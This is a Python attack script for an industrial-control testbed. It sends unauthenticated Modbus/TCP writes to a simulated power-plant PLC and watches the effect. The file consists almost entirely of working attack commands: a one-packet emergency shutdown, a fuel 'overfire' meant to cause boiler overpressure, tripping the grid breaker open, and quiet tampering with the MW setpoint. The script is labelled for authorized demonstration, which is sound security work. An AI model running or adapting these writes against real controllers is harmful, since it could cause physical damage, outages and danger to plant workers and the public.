#!/usr/bin/env python3
"""
attack.py - manual attack toolkit against the OT plant PLC (Layer 2).

AUTHORIZED TESTBED USE ONLY. Sends Modbus/TCP writes to the PLC to
demonstrate that it accepts unauthenticated commands. Each attack sends its
write(s) and then watches the key registers for a few seconds so you can see
the physical effect and the safety response.

Only standard library is used, so it runs on a fresh Debian box with nothing
installed but python3.

Usage:
    python3 attack.py <plc_ip> <attack> [arg]

Attacks:
    status            read-only snapshot of the key registers
    esd               one-packet emergency shutdown (REG 53 = 1)
    overfire          flip to MANUAL, slam fuel to 95 kg/min (boiler overpressure)
    breaker           flip to MANUAL, trip the grid breaker open (REG 34 = 0)
    setpoint <mw>     tamper the operator MW target (REG 57) - stays in AUTO, no trip
    restore           reset the sim (REG 63 = 1) and return to AUTO (REG 60 = 1)
    watch <seconds>   just watch the key registers

Example:
    python3 attack.py 192.168.56.11 overfire
"""

import socket
import struct
import sys
import time

PORT = 5020

FIRSTOUT = {0: "none", 1: "operator ESD", 2: "boiler overpressure", 3: "drum level lo-lo",
            4: "drum level hi-hi", 5: "flame failure", 6: "turbine overspeed",
            7: "high bearing vib", 8: "loss of lube oil", 9: "condenser vacuum loss",
            10: "reverse power", 11: "loss of excitation", 12: "electrical fault 87G"}
MODE = {0: "MANUAL", 1: "AUTO", 2: "Maint"}


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise IOError("PLC closed the connection mid-response")
        buf += chunk
    return buf


def connect(ip):
    return socket.create_connection((ip, PORT), timeout=3)


def write_single(sock, addr, val):
    """FC06 - write single holding register."""
    sock.sendall(struct.pack(">HHHBBHH", 1, 0, 6, 1, 6, addr, val))
    resp = recv_exact(sock, 12)
    if resp[7] != 6:
        raise IOError(f"write rejected, func 0x{resp[7]:02x}")


def read_all(sock, count=64):
    """FC03 - read holding registers 0..count-1."""
    sock.sendall(struct.pack(">HHHBBHH", 1, 0, 6, 1, 3, 0, count))
    _, _, length, _ = struct.unpack(">HHHB", recv_exact(sock, 7))
    pdu = recv_exact(sock, length - 1)
    if pdu[0] != 3:
        raise IOError(f"read rejected, func 0x{pdu[0]:02x}")
    return list(struct.unpack(f">{count}H", pdu[2:2 + pdu[1]]))


def status_line(r):
    return (f"press={r[1]:>3} PSI | rpm={r[20]:>4} | MW={r[30]:>3} | 52G={r[34]} | "
            f"MFT={r[50]} Ttrip={r[51]} ESD={r[53]} | mode={MODE.get(r[60], r[60]):<6} | "
            f"anomaly=0x{r[61]:04x} sec={r[62]} | cause={FIRSTOUT.get(r[56], r[56])}")


def monitor(ip, seconds):
    end = time.time() + seconds
    with connect(ip) as s:
        while time.time() < end:
            print("   " + status_line(read_all(s)))
            time.sleep(1)


def show_before(ip):
    with connect(ip) as s:
        print("[baseline] " + status_line(read_all(s)))


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        return 2
    ip, attack = sys.argv[1], sys.argv[2].lower()
    arg = sys.argv[3] if len(sys.argv) > 3 else None

    print(f"[attack.py] target PLC {ip}:{PORT}  (Modbus/TCP, unauthenticated)\n")

    try:
        if attack == "status":
            show_before(ip)
            return 0

        if attack == "watch":
            monitor(ip, int(arg) if arg else 15)
            return 0

        show_before(ip)

        if attack == "esd":
            with connect(ip) as s:
                write_single(s, 53, 1)
            print("[*] sent EMERGENCY SHUTDOWN  ->  REG 53 = 1  (one packet)\n")

        elif attack == "overfire":
            with connect(ip) as s:
                write_single(s, 60, 0)    # PLC to MANUAL so it stops trimming fuel
                write_single(s, 10, 95)   # fuel 95 kg/min - runaway overfire
            print("[*] REG 60 = 0 (MANUAL) then REG 10 = 95 (fuel slam)\n")

        elif attack == "breaker":
            with connect(ip) as s:
                write_single(s, 60, 0)
                write_single(s, 34, 0)    # open the generator breaker
            print("[*] REG 60 = 0 (MANUAL) then REG 34 = 0 (grid breaker open)\n")

        elif attack == "setpoint":
            mw = int(arg) if arg else 480
            with connect(ip) as s:
                write_single(s, 57, mw)   # quiet tamper, PLC keeps controlling
            print(f"[*] REG 57 = {mw} MW  (operator target tampered, still AUTO)\n")

        elif attack == "restore":
            with connect(ip) as s:
                write_single(s, 63, 1)    # reset simulation
                write_single(s, 60, 1)    # back to AUTO
            print("[*] REG 63 = 1 (reset) then REG 60 = 1 (AUTO)\n")

        else:
            print(f"unknown attack '{attack}'")
            print(__doc__)
            return 2

        print("[*] watching the plant react:")
        monitor(ip, 15)
        return 0

    except OSError as e:
        print(f"[attack.py] cannot reach / command PLC: {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
